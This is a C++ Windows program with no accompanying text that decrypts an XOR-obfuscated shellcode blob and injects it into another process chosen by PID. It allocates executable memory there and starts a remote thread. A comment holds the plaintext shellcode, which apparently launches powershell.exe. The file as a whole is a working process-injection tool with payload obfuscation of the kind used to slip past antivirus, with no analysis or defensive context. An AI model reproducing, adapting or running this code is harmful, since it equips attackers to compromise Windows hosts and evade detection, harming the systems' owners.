#include "Windows.h"
#include <iostream>

int main(int argc, char* argv[])
{
    if (argc != 2) {
        printf("pid please?");
        return -1;
    }

    DWORD pid = DWORD(atoi(argv[1]));

    unsigned char enced[] =
        "\x8f\x27\xee\x81\x84\x80\xa9\x6e\x67\x65\x2d\x22\x24\x23\x3d"
        "\x3c\x33\x3c\x59\xbb\x0b\x2f\xee\x3e\x13\x2d\xf8\x3d\x75\x2d"
        "\xff\x3a\x49\x26\xec\x17\x3c\x3b\x6a\xc4\x25\x27\x28\x45\xa1"
        "\x21\x5f\xa7\xc9\x50\x12\x19\x71\x43\x4d\x24\xb5\xa1\x64\x2f"
        "\x66\xa4\x8e\x9e\x37\x32\x3e\x25\xee\x26\x48\xe2\x2c\x5b\x2d"
        "\x6d\xa3\xee\xf3\xe7\x6d\x65\x74\x20\xec\xae\x13\x02\x24\x72"
        "\xb5\x23\xe4\x25\x7d\x30\xe3\x29\x4e\x2e\x64\xbc\x90\x33\x3b"
        "\x90\xa4\x24\xff\x5c\xe1\x26\x66\xb3\x21\x42\xac\x3b\x5e\xad"
        "\xc9\x35\xa9\xa0\x63\x26\x64\xad\x4b\x85\x06\x9e\x21\x66\x38"
        "\x4c\x61\x2b\x5e\xb4\x19\xab\x3d\x37\xe4\x2d\x41\x3d\x69\xb9"
        "\x08\x26\xee\x60\x3b\x21\xf8\x2f\x71\x2c\x75\xb8\x28\xe5\x63"
        "\xed\x24\x72\xb5\x32\x37\x2c\x3d\x2a\x31\x33\x2f\x3f\x24\x35"
        "\x32\x3f\x3b\xec\x81\x45\x35\x3a\x96\x8e\x3f\x24\x35\x29\x2d"
        "\xf8\x7d\x84\x32\x8b\x97\x96\x33\x2f\xdf\x6d\x73\x65\x73\x6f"
        "\x6d\x65\x74\x20\xe4\xe3\x66\x64\x6c\x73\x24\xc9\x5e\xe6\x0a"
        "\xf3\x97\xbc\xd5\x87\x78\x46\x79\x24\xc9\xc9\xf8\xd8\xe9\x97"
        "\xbc\x26\xe4\xa1\x44\x4f\x63\x0f\x65\xed\x9e\x94\x1d\x6c\xd5"
        "\x20\x76\x1e\x1c\x0f\x73\x36\x2c\xec\xae\x97\xbc\x1e\x08\x12"
        "\x09\x01\x16\x1b\x0a\x01\x09\x5a\x0d\x11\x0b\x67";

    /*    clear: 
    "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
    "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52"
    "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0"
    "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED"
    "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88"
    "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44"
    "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48"
    "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1"
    "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44"
    "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49"
    "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A"
    "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41"
    "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00"
    "\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B"
    "\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF"
    "\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47"
    "\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x70\x6F\x77\x65\x72"
    "\x73\x68\x65\x6C\x6C\x2E\x65\x78\x65\x00\x65" */


    char key[] = "somethingelse";

    unsigned char clear[sizeof enced];

    int j = 0;
    for (int i = 0; i < sizeof enced; i++) {
        if (j == sizeof key - 1) j = 0;

        clear[i] = enced[i] ^ key[j];
        j++;
    }

    printf("[+] decryption completed\n");

    /*size_t i = 0;
    for (i = 0; i < sizeof clear; ++i)
        fprintf(stdout, "\\x%02X%s", clear[i], (i + 1) % 16 == 0 ? "\"\r\n\"" : "");*/
    

    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    void* m = VirtualAllocEx(h, NULL, sizeof clear, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("[+] allocated %zu at address %p\n", sizeof clear, m);

    SIZE_T wrote;
    if (WriteProcessMemory(h, m, clear, sizeof clear, &wrote))
    {
        printf("[+] wrote: %zu bytes\n", wrote);
    }

    HANDLE t = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
    CloseHandle(h);

    return 0;
}

